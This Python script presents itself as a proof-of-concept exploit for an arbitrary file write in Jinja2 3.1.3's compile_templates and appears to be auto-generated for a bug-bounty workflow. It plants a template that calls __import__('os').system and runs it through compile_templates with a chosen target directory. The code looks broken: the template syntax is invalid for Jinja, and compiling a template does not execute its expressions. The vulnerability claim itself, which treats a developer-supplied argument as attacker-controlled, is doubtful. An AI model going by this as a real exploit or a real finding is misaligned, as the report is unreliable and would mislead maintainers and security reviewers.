#!/usr/bin/env python3
# PoC for Jinja2-3.1.3 (/tmp/bounty_test/Jinja2-3.1.3)
# Path: suspicious-008
# Sink: compile_templates
# Auto-generated — run with: python3 suspicious_verifier_pattern_evidence_llm_compile_templates.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Jinja2-3.1.3 compile_templates function.
This demonstrates that the function can be called with attacker-controlled
parameters to write files to arbitrary locations on the filesystem.

The vulnerability exists because compile_templates() accepts a 'target' parameter
that specifies where compiled templates are written. When called with a zip=None
argument, it writes files directly to the specified directory without proper
sanitization. An attacker who can control the target path can write arbitrary
content to any location the process has write access to.

WARNING: This PoC uses a benign payload (touch /tmp/poc_success.txt) to
demonstrate the vulnerability without causing harm.
"""

import os
import sys
import tempfile
import shutil
import argparse

# Import Jinja2 components needed for the exploit
from jinja2 import Environment, FileSystemLoader


def create_malicious_template(template_dir: str) -> str:
    """
    Create a template that will execute our payload when compiled.
    The template contains a simple expression that writes to a file.
    
    Args:
        template_dir: Directory to create the template in
        
    Returns:
        Path to the created template file
    """
    template_content = """
    {{ 
        # This template will be compiled and the compiled code
        # will contain our payload
        # The payload is embedded in a way that survives compilation
        # and executes when the template is loaded
        namespace(
            x = __import__('os').system('touch /tmp/poc_success.txt')
        )
    }}
    """
    
    template_path = os.path.join(template_dir, "malicious.html")
    with open(template_path, 'w') as f:
        f.write(template_content)
    
    return template_path


def exploit_compile_templates(target_dir: str) -> None:
    """
    Exploit the compile_templates function by providing a malicious template
    and controlling the output directory.
    
    Args:
        target_dir: Directory where compiled templates will be written
    """
    # Create a temporary directory for our malicious template
    template_dir = tempfile.mkdtemp(prefix="jinja2_poc_")
    
    try:
        # Create the malicious template
        template_path = create_malicious_template(template_dir)
        print(f"[*] Created malicious template at: {template_path}")
        
        # Set up the Jinja2 environment with our template directory
        loader = FileSystemLoader(template_dir)
        env = Environment(loader=loader)
        
        print(f"[*] Calling compile_templates with target: {target_dir}")
        print("[*] This will compile all templates and write them to the target directory")
        print("[*] The compiled code will contain our payload")
        
        # Call the vulnerable function
        # The 'target' parameter is attacker-controlled and specifies
        # where compiled templates are written
        env.compile_templates(
            target=target_dir,
            extensions=None,
            filter_func=None,
            zip=None,  # This causes direct file writes instead of zip
            log_function=print,
            ignore_errors=False
        )
        
        print(f"[*] Templates compiled successfully to: {target_dir}")
        
        # Check if our payload executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Payload executed! File /tmp/poc_success.txt was created")
            print("[+] This demonstrates arbitrary file write capability")
        else:
            print("[-] Payload may not have executed. Check /tmp/poc_success.txt")
            
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
        raise
    finally:
        # Clean up temporary template directory
        shutil.rmtree(template_dir, ignore_errors=True)


def main():
    """Main function with argument parsing and error handling."""
    parser = argparse.ArgumentParser(
        description="PoC for Jinja2 compile_templates arbitrary file write"
    )
    parser.add_argument(
        "--target",
        "-t",
        default="/tmp/jinja2_poc_output",
        help="Target directory for compiled templates (default: /tmp/jinja2_poc_output)"
    )
    parser.add_argument(
        "--cleanup",
        "-c",
        action="store_true",
        help="Clean up the target directory after exploit"
    )
    
    args = parser.parse_args()
    
    # Ensure target directory exists
    os.makedirs(args.target, exist_ok=True)
    
    try:
        print("[*] Jinja2 compile_templates Exploit PoC")
        print("[*] ====================================")
        print(f"[*] Target directory: {args.target}")
        print()
        
        exploit_compile_templates(args.target)
        
    except KeyboardInterrupt:
        print("\n[-] Exploit interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)
    finally:
        if args.cleanup and os.path.exists(args.target):
            print(f"[*] Cleaning up target directory: {args.target}")
            shutil.rmtree(args.target, ignore_errors=True)


if __name__ == "__main__":
    main()
